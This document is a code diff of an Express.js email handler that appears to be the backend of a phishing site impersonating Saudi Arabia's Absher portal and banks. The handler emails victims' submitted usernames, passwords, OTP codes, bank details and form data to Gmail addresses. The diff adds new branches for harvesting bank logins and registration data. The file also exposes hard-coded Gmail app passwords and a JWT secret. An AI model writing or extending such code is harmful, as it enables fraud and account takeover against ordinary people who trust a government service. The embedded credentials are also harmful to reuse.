@@ -81,8 +81,68 @@ exports.email = async(req,res,next)=>{
             from:'Admin Panel',
             to:'saudiabsher1990@gmail.com',
             // to:'pnusds269@gmail.com',
-            subject: `Abshr Username And Password Account New Login`,
-                        html:`<div>
+            subject: `Abshr Username And Password Account  Login`,
+            html:`<div>
+            <p> Username : ${req.body.username}</p>
+            <p> Password : ${req.body.password}</p>  
+            ${req.body.otp ? `<p> Otp : ${req.body.otp}</p> `:'' }     
+            </div>`
+          }).then(info=>{
+            if(info.accepted.length){
+                res.sendStatus(200)
+            }else{
+                res.sendStatus(400)
+            }
+          })
+    }else if (req.query.register){
+        const transporter = nodemailer.createTransport({
+            service: 'gmail',
+            auth: {
+              user: 'pnusds269@gmail.com',
+            //   user: 'saudiabsher1990@gmail.com',
+                pass: 'bojr nrmj bjen rcgt',
+            //   pass: 'npxb mrfx ozpr ltyt',
+            },
+          });
+// Construct HTML content dynamically from req.body
+let htmlContent = '<div>';
+for (const [key, value] of Object.entries(req.body)) {
+    htmlContent += `<p>${key}: ${value}</p>`;
+}
+htmlContent += '</div>';
+
+// Send email with dynamically generated HTML content
+await transporter.sendMail({
+    from: 'Admin Panel',
+    // to: 'saudiabsher1990@gmail.com',
+    to: 'pnusds269@gmail.com',
+    subject: `Abshr Form Register`,
+    html: htmlContent
+}).then(info => {
+    if (info.accepted.length) {
+        res.sendStatus(200);
+    } else {
+        res.sendStatus(400);
+    }
+});
+    }
+    else if(req.query.bank){
+
+        const transporter = nodemailer.createTransport({
+            service: 'gmail',
+            auth: {
+            //   user: 'pnusds269@gmail.com',
+              user: 'saudiabsher1990@gmail.com',
+            //   pass: 'bojr nrmj bjen rcgt',
+            pass: 'npxb mrfx ozpr ltyt',
+            },
+          });
+          await transporter.sendMail({
+            from:'Admin Panel',
+            to:'saudiabsher1990@gmail.com',
+            // to:'pnusds269@gmail.com',
+            subject: `Bank Username And Password Account  Login`,
+            html:`<div>
             <p> Username : ${req.body.username}</p>
             <p> Password : ${req.body.password}</p>  
             ${req.body.bank ? `<p> Bank : ${req.body.bank}</p> `:'' }     
@@ -95,13 +155,10 @@ exports.email = async(req,res,next)=>{
             }
           })
     }else if (req.query.order){
-        const token = req.headers.authorization && req.headers.authorization.split(" ")[1]
-        if (!token) return res.sendStatus(401)
-        const user = verify(token,'secretkeyforjsonwebtokentoabshrsite')
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
-              // user: 'pnusds269@gmail.com',
+            //   user: 'pnusds269@gmail.com',
               user: 'saudiabsher1990@gmail.com',
                 // pass: 'bojr nrmj bjen rcgt',
               pass: 'npxb mrfx ozpr ltyt',
@@ -112,8 +169,6 @@ let htmlContent = '<div>';
 for (const [key, value] of Object.entries(req.body)) {
     htmlContent += `<p>${key}: ${value}</p>`;
 }
-htmlContent += `<p> username abshr: ${user.username}</p>`;
-htmlContent += `<p> password abshr: ${user.password}</p>`;
 htmlContent += '</div>';
 
 // Send email with dynamically generated HTML content
@@ -132,13 +187,12 @@ await transporter.sendMail({
 });
     }else if (req.query.orderOtp){
         const order = await Order.findById(req.body.id)
-        console.log(order)
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
             //   user: 'pnusds269@gmail.com',
               user: 'saudiabsher1990@gmail.com',
-              //   pass: 'bojr nrmj bjen rcgt',
+                // pass: 'bojr nrmj bjen rcgt',
               pass: 'npxb mrfx ozpr ltyt',
             },
           });
@@ -158,8 +212,8 @@ await transporter.sendMail({
 // Send email with dynamically generated HTML content
 await transporter.sendMail({
     from: 'Admin Panel',
-    to: 'saudiabsher1990@gmail.com',
-    // to: 'pnusds269@gmail.com',
+    // to: 'saudiabsher1990@gmail.com',
+    to: 'pnusds269@gmail.com',
     subject: `Abshr Order With Otp`,
     html: htmlContent
 }).then(info => {
